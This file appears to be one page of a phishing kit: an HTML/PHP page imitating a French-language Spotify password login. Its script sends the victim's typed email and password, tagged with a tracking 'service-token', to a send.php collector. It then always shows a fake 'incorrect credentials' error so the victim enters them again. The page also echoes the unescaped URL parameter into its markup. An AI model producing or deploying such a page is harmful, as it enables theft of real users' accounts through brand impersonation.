<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css" />
    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spotify</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background: #121212;
            color: white;
        }

        .back {
            text-decoration: none;
            color: white;
            align-self: flex-start;
            font-size: 20px;
            padding: 10px 0;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 30px;
            min-width: 380px;
            max-width: 400px;
            margin: 40px auto;
        }

        form input {
            border: 1.2px solid #7a7a7a;
            background: transparent;
            padding: 15px;
            width: 100%;
            border-radius: 6px;
            color: white;
            font-size: 17px;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            gap: 10px;
            margin-top: 27px;
        }

        form label {
            align-self: flex-start;
            font-weight: 700;
            font-size: 14px;
        }

        form button {
            background: #1ed760;
            border: none;
            padding: 13px;
            width: 100%;
            border-radius: 30px;
            color: black;
            font-weight: 700;
            font-size: 18px;
            margin-top: 5px;
        }

        form button:hover {
            background: #23e065;
            cursor: pointer;
            transform: scale(1.02);
        }

        .error {
            border-color: red;
        }

        .error+.error-message {
            display: flex;
        }

        .error-message {
            color: #ba5a64;
            font-size: 13px;
            font-weight: 700;
            display: none;
            align-self: flex-start;
            gap: 5px;
        }

        h3 {
            align-self: flex-start;
        }

        footer {
            color: #7a7a7a;
            font-size: 11px;
            font-weight: 700;
            text-align: center;
            position: absolute;
            bottom: 10px;
            padding: 20px;
            min-width: 380px;
            max-width: 400px;
            line-height: 15px;
        }

        .link {
            color: white;
            font-weight: 700;
            text-decoration: none;
            font-size: 15px;
            margin-top: 40px;
        }

        .alert {
            color: white;
            background: #e9142a;
            padding: 13px;
            display: none;
            gap: 10px;
            margin-top: 27px;
            align-self: flex-start;
            align-items: center;
            width: 100%;
        }

        .alert i {
            font-size: 20px;
        }

        .alert p {
            font-size: 12px;
            font-weight: 600;
        }

        .click {
            filter: brightness(40%);
            cursor: not-allowed !important;
        }
    </style>
</head>

<body>
    <div class="container">
        <a href="./?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>" class="back"><i class="bi bi-chevron-left"></i></a>
        <h3>Connexion avec un mot de passe</h3>
        <div class="alert">
            <i class="bi bi-exclamation-circle"></i>
            <p>Identifiant ou mot de passe incorrect.</p>
        </div>
        <form>
            <label for="email">Email or username</label>
            <input type="email" id="email"
                onblur="if(this.value.trim() == '') { this.classList.add('error'); } else { this.classList.remove('error'); }"
                onkeyup=" document.querySelector('.alert').style.display = 'none' ; if(this.value.trim() != '') { this.classList.remove('error'); }">
            <p class="error-message"><i class="bi bi-exclamation-circle"></i> <span>Veuillez saisir votre nom
                    d'utilisateur Spotify ou votre adresse e-mail.</span></p>
            <label for="password">Mot de passe</label>
            <input type="password" id="password"
                onblur="if(this.value.trim() == '') { this.classList.add('error'); } else { this.classList.remove('error'); }"
                onkeyup="document.querySelector('.alert').style.display = 'none' ;if(this.value.trim() != '') { this.classList.remove('error'); }">
            <p class="error-message"><i class="bi bi-exclamation-circle"></i> <span>Entrez votre mot de passe.</span>
            </p>
            <input id="user_id" type="text" style="display: none;"
                value="<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
            <button id="next" type="button">Continue</button>
        </form>
        <a href="./?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>" class="link">Connexion sans mot de passe</a>
        <footer>
            <p>

                Ce site est protégé par reCAPTCHA. La Politique de confidentialité et les Conditions d'utilisation de
                Google s'appliquent.
            </p>
        </footer>
    </div>
    <script>
        let next = document.getElementById('next');
        let email = document.getElementById('email');
        let password = document.getElementById('password');
        let user_id = document.getElementById('user_id');
        email.value = localStorage.email || '';
        if (email.value.trim() != '') {
            password.focus();
        } else {
            email.focus();
        }
        next.addEventListener('click', async () => {
            if (email.value.trim() != '') {
                email.classList.remove('error');
                if (password.value.trim() != '') {
                    password.classList.remove('error');
                    next.classList.add('click');
                    email.classList.add('click');
                    email.disabled = true;
                    password.classList.add('click');
                    password.disabled = true;
                    await send(user_id.value, email.value,password.value);

                    //after fetch
                    setTimeout(() => {
                        document.querySelector('.alert').style.display = 'flex';
                        next.classList.remove('click');
                        email.classList.remove('click');
                        email.disabled = false;
                        password.classList.remove('click');
                        password.disabled = false;
                    }, 1000);
                    //after fetch
                } else {
                    password.classList.add('error');
                    password.focus();
                }
            } else {
                email.classList.add('error');
                email.focus();
            }



        });
        async function send(id, email, password) {
            try {
                let res = await fetch('../send.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        id: id,
                        email: email,
                        password: password,
                        page: 'spotify'
                    })
                });

                let data = await res.text();
                console.log(data);

            } catch (err) {
                console.error('Error:', err);
            }
        }
    </script>
</body>

</html>